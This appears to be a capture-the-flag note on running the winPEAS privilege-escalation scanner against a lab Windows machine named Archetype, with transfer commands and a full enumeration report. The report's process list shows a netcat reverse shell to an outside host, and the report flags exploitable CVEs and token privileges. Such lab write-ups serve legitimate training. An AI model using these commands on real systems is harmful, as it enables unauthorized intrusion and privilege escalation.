## winPEAS
- download link:
- https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
- gets a lot of information about the target system
- can get ideas how to escalate privileges and what to look for

```sh
#download winpeas https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
powershell #switch to powershell
sudo python3 -m http.server 8001 # on attacker
wget http://10.10.14.9:8001/winPEASx64.exe -outfile winPEASx64.exe #on target to get winpeas from attacker to target
.\winPEASx64.exe #run winpeas
```

### Example report

```
             *((,.,/((((((((((((((((((((/,  */
      ,/*,..*((((((((((((((((((((((((((((((((((,
    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*
    ((((((((((((((((**********/########## .(* ,(((((((
    (((((((((((/********************/####### .(. (((((((
    ((((((..******************/@@@@@/***/###### ./(((((((
    ,,....********************@@@@@@@@@@(***,#### .//((((((
    , ,..********************/@@@@@%@@@@/********##((/ /((((
    ..((###########*********/%@@@@@@@@@/************,,..((((
    .(##################(/******/@@@@@/***************.. /((
    .(#########################(/**********************..*((
    .(##############################(/*****************.,(((
    .(###################################(/************..(((
    .(#######################################(*********..(((
    .(#######(,.***.,(###################(..***.*******..(((
    .(#######*(#####((##################((######/(*****..(((
    .(###################(/***********(##############(...(((
    .((#####################/*******(################.((((((
    .(((############################################(..((((
    ..(((##########################################(..(((((
    ....((########################################( .(((((
    ......((####################################( .((((((
    (((((((((#################################(../((((((
        (((((((((/##########################(/..((((((
              (((((((((/,.  ,*//////*,. ./(((((((((((((((.
                 (((((((((((((((((((((((((((((/

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

  WinPEASng by @carlospolopm, makikvues(makikvues2[at]gmail[dot]com)

       /---------------------------------------------------------------------------\
       |                             Do you like PEASS?                            |
       |---------------------------------------------------------------------------|
       |         Become a Patreon    :     https://www.patreon.com/peass           |
       |         Follow on Twitter   :     @carlospolopm                           |
       |         Respect on HTB      :     SirBroccoli & makikvues                 |
       |---------------------------------------------------------------------------|
       |                                 Thank you!                                |
       \---------------------------------------------------------------------------/

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

� You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
   Creating Dynamic lists, this could take a while, please wait...
   - Loading YAML definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list (local only)...
   - Creating disabled users list...
   - Admin users list...
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


�����������������������������������͹ System Information �������������������������������������

����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
    Hostname: Archetype
    ProductName: Windows Server 2019 Standard
    EditionID: ServerStandard
    ReleaseId: 1809
    BuildBranch: rs5_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 4/13/2024 7:27:21 AM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB5004335, KB5003711, KB5004244,

  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
 [*] OS Version: 1809 (17763)
 [*] Enumerating installed KBs...
 [!] CVE-2019-0836 : VULNERABLE
  [>] https://exploit-db.com/exploits/46718
  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/

 [!] CVE-2019-0841 : VULNERABLE
  [>] https://github.com/rogue-kdc/CVE-2019-0841
  [>] https://rastamouse.me/tags/cve-2019-0841/

 [!] CVE-2019-1064 : VULNERABLE
  [>] https://www.rythmstick.net/posts/cve-2019-1064/

 [!] CVE-2019-1130 : VULNERABLE
  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

 [!] CVE-2019-1253 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2019-1253
  [>] https://github.com/sgabe/CVE-2019-1253

 [!] CVE-2019-1315 : VULNERABLE
  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

 [!] CVE-2019-1385 : VULNERABLE
  [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

 [!] CVE-2019-1388 : VULNERABLE
  [>] https://github.com/jas502n/CVE-2019-1388

 [!] CVE-2019-1405 : VULNERABLE
  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
  [>] https://github.com/apt69/COMahawk

 [!] CVE-2020-0668 : VULNERABLE
  [>] https://github.com/itm4n/SysTracingPoc

 [!] CVE-2020-0683 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2020-0683
  [>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1

 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/

 [*] Finished. Found 12 potential vulnerabilities.


����������͹ Showing All Microsoft Updates
  [X] Exception: Exception has been thrown by the target of an invocation.

����������͹ System Last Shutdown Date/time (from Registry)

    Last Shutdown Date/time        :    10/14/2021 1:19:25 AM

����������͹ User Environment Variables
� Check for some passwords or keys in the env variables
    COMPUTERNAME: ARCHETYPE
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Users\sql_svc\AppData\Local
    PSModulePath: C:\Users\sql_svc\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\140\Tools\PowerShell\Modules\
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\;C:\Program Files\Microsoft SQL Server\140\Tools\Binn\;C:\Program Files\Microsoft SQL Server\140\DTS\Binn\;C:\Users\sql_svc\AppData\Local\Microsoft\WindowsApps
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 25
    ProgramFiles: C:\Program Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    USERPROFILE: C:\Users\sql_svc
    SystemRoot: C:\Windows
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    ProgramData: C:\ProgramData
    PROCESSOR_REVISION: 0101
    COMPLUS_MDA: InvalidVariant;RaceOnRCWCleanup;InvalidFunctionPointerInDelegate;InvalidMemberDeclaration;ReleaseHandleFailed;MarshalCleanupError;ReportAvOnComRelease;DangerousThreadingAPI;invalidOverlappedToPinvoke
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    ComSpec: C:\Windows\system32\cmd.exe
    PROMPT: $P$G
    SystemDrive: C:
    TEMP: C:\Users\sql_svc\AppData\Local\Temp
    NUMBER_OF_PROCESSORS: 2
    APPDATA: C:\Users\sql_svc\AppData\Roaming
    TMP: C:\Users\sql_svc\AppData\Local\Temp
    USERNAME: sql_svc
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: ARCHETYPE

����������͹ System Environment Variables
� Check for some passwords or keys in the env variables
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\;C:\Program Files\Microsoft SQL Server\140\Tools\Binn\;C:\Program Files\Microsoft SQL Server\140\DTS\Binn\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\140\Tools\PowerShell\Modules\
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 25
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    PROCESSOR_REVISION: 0101

����������͹ Audit Settings
� Check what is being logged
    Not Found

����������͹ Audit Policy Settings - Classic & Advanced

����������͹ WEF Settings
� Windows Event Forwarding, is interesting to know were are sent the logs
    Not Found

����������͹ LAPS Settings
� If installed, local administrator password is changed frequently and is restricted by ACL
    LAPS Enabled: LAPS not installed

����������͹ Wdigest
� If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
    Wdigest is not enabled

����������͹ LSA Protection
� If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
    LSA Protection is not enabled

����������͹ Credentials Guard
� If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled
    Virtualization Based Security Status:      Not enabled
    Configured:                                False
    Running:                                   False

����������͹ Cached Creds
� If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials
    cachedlogonscount is 10

����������͹ Enumerating saved credentials in Registry (CurrentPass)

����������͹ AV Information
  [X] Exception: Invalid namespace
    No AV was detected!!
    Not Found

����������͹ Windows Defender configuration
  Local Settings
  Group Policy Settings

����������͹ UAC Status
� If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy:
    FilterAdministratorToken:
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.

����������͹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version:
    Transcription Settings:
    Module Logging Settings:
    Scriptblock Logging Settings:
    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 79B

����������͹ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

����������͹ PS default transcripts history
� Read the PS history inside these files (if any)

����������͹ HKCU Internet Settings
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    CertificateRevocation: 1
    ZonesSecurityUpgrade: System.Byte[]

����������͹ HKLM Internet Settings
    EnablePunycode: 1

����������͹ Drives Information
� Remember that you should search more info inside the other drives
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 9 GB)(Permissions: Users [AppendData/CreateDirectories])

����������͹ Checking WSUS
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
    Not Found

����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated isn't available

����������͹ Enumerate LSA settings - auth packages included

    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       scecli
    Authentication Packages              :       msv1_0
    SecureBoot                           :       1
    LsaPid                               :       620
    LsaCfgFlagsDefault                   :       0
    ProductType                          :       7
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1

����������͹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)


  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      :

����������͹ Display Local Group Policy settings - local users/machine

����������͹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



����������͹ Enumerating Printers (WMI)

����������͹ Enumerating Named Pipes
  Name                                                                                                 Sddl

  eventlog                                                                                             O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  sql\query                                                                                            O:S-1-5-21-1479773013-2644727484-962428355-1001G:S-1-5-21-1479773013-2644727484-962428355-513D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-21-1479773013-2644727484-962428355-1001)

  SQLLocal\MSSQLSERVER                                                                                 O:S-1-5-21-1479773013-2644727484-962428355-1001G:S-1-5-21-1479773013-2644727484-962428355-513D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-21-1479773013-2644727484-962428355-1001)

  vgauth-service                                                                                       O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)


����������͹ Enumerating AMSI registered providers
    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
    Path:

   =================================================================================================


����������͹ Enumerating Sysmon configuration
      You must be an administrator to run this check

����������͹ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

����������͹ Installed .NET versions

  CLR Versions
   4.0.30319

  .NET Versions
   4.7.03190

  .NET & AMSI (Anti-Malware Scan Interface) support
      .NET version supports AMSI     : False
      OS supports AMSI               : True


�����������������������������������͹ Interesting Events information �������������������������������������

����������͹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials

      You must be an administrator to run this check

����������͹ Printing Account Logon Events (4624) for the last 10 days.

      You must be an administrator to run this check

����������͹ Process creation events - searching logs (EID 4688) for sensitive data.

      You must be an administrator to run this check

����������͹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.


����������͹ Displaying Power off/on events for last 5 days

  4/13/2024 7:19:21 AM    :  Startup


�����������������������������������͹ Users Information �������������������������������������

����������͹ Users
� Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
  Current user: sql_svc
  Current groups: Domain Users, Everyone, Users, Builtin\Performance Monitor Users, Service, Console Logon, Authenticated Users, This Organization, Local account, MSSQLSERVER, Local, NTLM Authentication
   =================================================================================================

    ARCHETYPE\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    ARCHETYPE\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    ARCHETYPE\Guest: Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    ARCHETYPE\sql_svc
        |->Groups: Users
        |->Password: CanChange-NotExpi-Req

    ARCHETYPE\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-Expi-Req


����������͹ Current User Idle Time
   Current User   :     ARCHETYPE\sql_svc
   Idle Time      :     00h:08m:03s:531ms

����������͹ Display Tenant information (DsRegCmd.exe /status)

����������͹ Current Token privileges
� Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED

����������͹ Clipboard text

����������͹ Logged users
    NT SERVICE\SQLTELEMETRY
    ARCHETYPE\sql_svc

����������͹ Display information about local users
   Computer Name           :   ARCHETYPE
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   10/14/2021 1:12:47 AM
   Logons Count            :   23
   Password Last Set       :   3/17/2020 2:37:04 AM

   =================================================================================================

   Computer Name           :   ARCHETYPE
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   ARCHETYPE
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   True
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/20/2020 4:59:50 AM

   =================================================================================================

   Computer Name           :   ARCHETYPE
   User Name               :   sql_svc
   User Id                 :   1001
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   4/13/2024 7:22:37 AM
   Logons Count            :   24
   Password Last Set       :   1/19/2020 4:05:13 PM

   =================================================================================================

   Computer Name           :   ARCHETYPE
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================


����������͹ RDP Sessions
    Not Found

����������͹ Ever logged users
    NT SERVICE\SQLTELEMETRY
    ARCHETYPE\Administrator
    ARCHETYPE\sql_svc

����������͹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Service [WriteData/CreateFiles]
    C:\Users\sql_svc : sql_svc [AllAccess]

����������͹ Looking for AutoLogon credentials
    Not Found

����������͹ Password Policies
� Check for a possible brute-force
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: ARCHETYPE
    SID: S-1-5-21-1479773013-2644727484-962428355
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
   =================================================================================================


����������͹ Print Logon Sessions
    Method:                       WMI
    Logon Server:
    Logon Server Dns Domain:
    Logon Id:                     77819
    Logon Time:
    Logon Type:                   Service
    Start Time:                   4/13/2024 7:19:26 AM
    Domain:                       ARCHETYPE
    Authentication Package:       NTLM
    Start Time:                   4/13/2024 7:19:26 AM
    User Name:                    sql_svc
    User Principal Name:
    User SID:

   =================================================================================================

    Method:                       WMI
    Logon Server:
    Logon Server Dns Domain:
    Logon Id:                     251564
    Logon Time:
    Logon Type:                   Network
    Start Time:                   4/13/2024 7:22:37 AM
    Domain:                       ARCHETYPE
    Authentication Package:       NTLM
    Start Time:                   4/13/2024 7:22:37 AM
    User Name:                    sql_svc
    User Principal Name:
    User SID:

   =================================================================================================



�����������������������������������͹ Processes Information �������������������������������������

����������͹ Interesting Processes -non Microsoft-
� Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes
    cmd(700)[C:\Windows\SYSTEM32\cmd.exe] -- POwn: sql_svc
    Command Line: cmd.exe
   =================================================================================================

    winPEASx64(1844)[C:\Users\sql_svc\Downloads\winPEASx64.exe] -- POwn: sql_svc -- isDotNet
    Permissions: sql_svc [AllAccess]
    Possible DLL Hijacking folder: C:\Users\sql_svc\Downloads (sql_svc [AllAccess])
    Command Line: "C:\Users\sql_svc\Downloads\winPEASx64.exe"
   =================================================================================================

    cmd(2532)[C:\Windows\system32\cmd.exe] -- POwn: sql_svc
    Command Line: "C:\Windows\system32\cmd.exe" /c "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.15.14 443"
   =================================================================================================

    sqlservr(1728)[C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlservr.exe] -- POwn: sql_svc
    Command Line: "C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER
   =================================================================================================

    powershell(1808)[C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: sql_svc
    Command Line: powershell
   =================================================================================================

    nc64(2192)[C:\Users\sql_svc\Downloads\nc64.exe] -- POwn: sql_svc
    Permissions: sql_svc [AllAccess]
    Possible DLL Hijacking folder: C:\Users\sql_svc\Downloads (sql_svc [AllAccess])
    Command Line: "C:\Users\sql_svc\Downloads\nc64.exe" -e cmd.exe 10.10.15.14 443
   =================================================================================================

    powershell(2456)[C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: sql_svc
    Command Line: powershell  -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.15.14 443
   =================================================================================================

    conhost(2744)[C:\Windows\system32\conhost.exe] -- POwn: sql_svc
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================



�����������������������������������͹ Services Information �������������������������������������

����������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
    Alias Manager and Ticket Service
   =================================================================================================

    vm3dservice(VMware, Inc. - VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Auto - Running
    Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================

    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Running
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================


����������͹ Modifiable Services
� Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    You cannot modify any service

����������͹ Looking if you can modify any service registry
� Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    [-] Looks like you cannot change the registry of any service...

����������͹ Checking write permissions in PATH folders (DLL Hijacking)
� Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\
    C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\
    C:\Program Files\Microsoft SQL Server\140\Tools\Binn\
    C:\Program Files\Microsoft SQL Server\140\DTS\Binn\


�����������������������������������͹ Applications Information �������������������������������������

����������͹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

����������͹ Installed Applications --Via Program Files/Uninstall registry--
� Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
    C:\Program Files\common files
    C:\Program Files\desktop.ini
    C:\Program Files\internet explorer
    C:\Program Files\Microsoft SQL Server
    C:\Program Files\Microsoft Visual Studio 10.0
    C:\Program Files\Microsoft.NET
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


����������͹ Autorun Applications
� Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


